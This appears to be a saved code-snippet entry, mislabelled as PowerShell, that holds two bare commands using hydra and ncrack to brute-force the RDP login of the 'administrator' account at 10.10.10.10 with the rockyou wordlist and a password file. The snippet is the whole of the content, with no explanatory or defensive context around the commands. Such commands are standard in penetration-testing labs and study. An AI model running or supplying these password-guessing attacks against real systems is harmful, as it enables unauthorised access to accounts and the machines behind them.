---
id: bcfe9cdc-f659-4d87-a4db-84660cc32834
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.330829+00:00'
updated_at: '2023-04-10T20:25:55.682065+00:00'
---

# Code Snippet bcfe9cdc

**Language**: Powershell

```powershell
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```
